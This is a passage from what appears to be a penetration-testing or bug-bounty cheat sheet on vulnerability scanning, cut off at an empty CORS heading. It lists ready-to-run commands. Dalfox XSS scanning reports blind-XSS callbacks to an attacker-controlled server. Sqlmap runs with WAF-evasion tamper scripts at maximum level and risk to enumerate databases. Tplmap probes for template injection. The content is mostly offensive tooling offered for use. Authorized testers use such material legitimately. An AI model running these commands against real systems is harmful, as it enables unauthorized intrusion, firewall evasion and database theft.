## VULN SCANNING (Calculus-Gated)

### XSS
```bash
# Reflected
cat params.txt | Gxss -c 100 -p XssReflected | dalfox pipe -b $XSS_SERVER -w 100

# Blind XSS
cat params.txt | dalfox pipe -b https://your-xss-server.com -blind
```

### SQL Injection
```bash
# Error-based (quick)
sqlmap -m params.txt --batch --random-agent --level 1 --risk 1 --tamper=space2comment --dbs

# WAF bypass (high-value params)
sqlmap -m high-value-params.txt --batch --random-agent --tamper=space2comment,randomcase,between,charencode --level 5 --risk 3 --dbs
```

### SSTI
```bash
tplmap -m params.txt
```

### CORS
```bash
